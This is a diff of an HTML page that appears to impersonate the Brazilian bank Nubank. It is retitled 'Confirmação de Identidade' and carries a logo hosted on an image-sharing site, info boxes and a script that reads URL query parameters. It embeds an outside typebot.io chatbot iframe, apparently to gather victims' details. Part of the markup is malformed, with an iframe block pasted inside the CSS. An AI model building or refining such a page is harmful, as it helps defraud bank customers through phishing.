@@ -3,35 +3,73 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Chat Seguro - Nubank</title>
+  <title>Confirmação de Identidade - Nubank</title>
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      width: 100%;
+    body {
+      font-family: Arial, sans-serif;
       background: #ffffff;
-    }
-
-    .iframe-wrapper {
-      width: 100vw;
-      height: 100vh;
+      text-align: center;
+      padding: 30px;
       margin: 0;
-      padding: 0;
-      overflow: hidden;
     }
 
-    iframe {
-      border: none;
+    .container {
       width: 100%;
-      height: 100%;
+      max-width: 90%;
+      margin: 0 auto;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      padding: 5vw;
+      box-sizing: border-box;
+    }
+
+    <div style="width: 100%; max-width: 100%; overflow: hidden;">
+  <iframe
+    src="https://typebot.io/xyz"
+    style="width: 100%; height: 90vh; border: none;"
+    allow="clipboard-write"
+  ></iframe>
+</div>
+
+
+    .logo {
+      margin-bottom: 10px;
+    }
+
+    .divider {
+      border-top: 3px solid #8000ff;
+      margin: 20px 0;
+    }
+
+    .info-box {
+      background: #f3f3f3;
+      padding: 15px;
+      margin-bottom: 10px;
+      border-radius: 5px;
+      text-align: left;
+    }
+
+    .info-box b {
       display: block;
+      font-size: 0.9em;
+      color: #777;
+    }
+
+    .info-box span {
+      font-weight: bold;
+      font-size: 1.1em;
+    }
+
+    .footer {
+      font-size: 0.9em;
+      color: #666;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  
- <div class="container">
+
+  <div class="container">
     <img
       class="logo"
       src="https://i.postimg.cc/X7JSyHqM/Captura-de-tela-2025-05-30-234638.png"
@@ -80,7 +118,6 @@
       Santa Catarina
     </div>
   </div>
-
 
   <script>
     function getQueryParam(param) {
